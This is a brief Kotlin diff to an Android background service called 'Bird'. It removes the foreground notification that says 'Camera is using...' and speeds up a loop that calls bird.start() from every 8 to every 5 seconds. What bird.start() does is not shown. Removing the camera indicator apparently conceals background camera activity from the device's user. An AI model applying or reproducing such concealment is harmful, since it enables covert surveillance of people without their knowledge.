@@ -34,24 +34,13 @@ class Bird : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
-        val notification: Notification = NotificationCompat.Builder(this, "Channel_ID")
-            .setContentTitle("Emu")
-            .setContentText("Camera is using...")
-            .build()
 
         Log.i("USB", "d")
-
-        // Start the service as a foreground service
-        try {
-            startForeground(NOTIFICATION_ID, notification)
-        } catch (e: java.lang.IllegalStateException) {
-            Log.e("USB", "ERROR")
-        }
 
         serviceScope.launch {
             while(true) {
                 bird.start()
-                delay(8000)
+                delay(5000)
             }
         }
 
